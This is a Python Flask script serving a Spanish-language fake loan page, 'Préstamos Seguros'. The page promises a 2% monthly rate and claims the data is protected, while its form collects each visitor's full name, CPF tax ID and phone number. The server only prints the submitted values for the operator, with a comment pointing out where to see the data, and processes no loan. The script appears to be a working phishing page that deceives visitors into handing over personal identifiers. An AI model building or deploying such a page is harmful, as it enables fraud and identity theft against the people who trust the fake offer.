from flask import Flask, request, render_template_string

app = Flask(__name__)

form = '''
<!DOCTYPE html>
<html>
<head>
<title>Préstamos Seguros</title>

<style>
body {
    background: linear-gradient(135deg, #0A1F44, #000000);
    font-family: Arial;
    color: white;
    text-align: center;
    padding-top: 40px;
}

.logo {
    font-size: 28px;
    font-weight: bold;
    color: #1E90FF;
    margin-bottom: 10px;
}

.subtitle {
    color: #aaa;
    margin-bottom: 20px;
}

.card {
    background: #111;
    padding: 25px;
    border-radius: 15px;
    width: 320px;
    margin: auto;
    box-shadow: 0 0 25px rgba(30,144,255,0.4);
}

input {
    width: 90%;
    padding: 12px;
    margin: 10px;
    border: none;
    border-radius: 8px;
}

button {
    background: #1E90FF;
    color: white;
    padding: 12px;
    width: 95%;
    border: none;
    border-radius: 10px;
    font-weight: bold;
}

button:hover {
    background: #4aa3ff;
}

.rate {
    margin-top: 15px;
    color: #00FFAA;
    font-size: 14px;
}

.secure {
    font-size: 12px;
    margin-top: 10px;
    color: #aaa;
}
</style>
</head>

<body>

<div class="logo">🔵 PRÉSTAMOS SEGUROS</div>
<div class="subtitle">Rápido • Confiable • Sin complicaciones</div>

<div class="card">
    <form method="post">
        <input name="nombre" placeholder="Nombre completo"><br>
        <input name="cpf" placeholder="CPF"><br>
        <input name="telefono" placeholder="Teléfono"><br>

        <button type="submit">Solicitar préstamo</button>
    </form>

    <div class="rate">💸 Tasa desde 2% mensual</div>
    <div class="secure">🔒 Datos protegidos</div>
</div>

</body>
</html>
'''

@app.route("/", methods=["GET","POST"])
def home():
    if request.method == "POST":
        nombre = request.form["nombre"]
        cpf = request.form["cpf"]
        telefono = request.form["telefono"]

        print(nombre, cpf, telefono)  # 👈 aquí ves los datos

        return "Solicitud enviada ✅"

    return render_template_string(form)

app.run(host="0.0.0.0", port=5000)
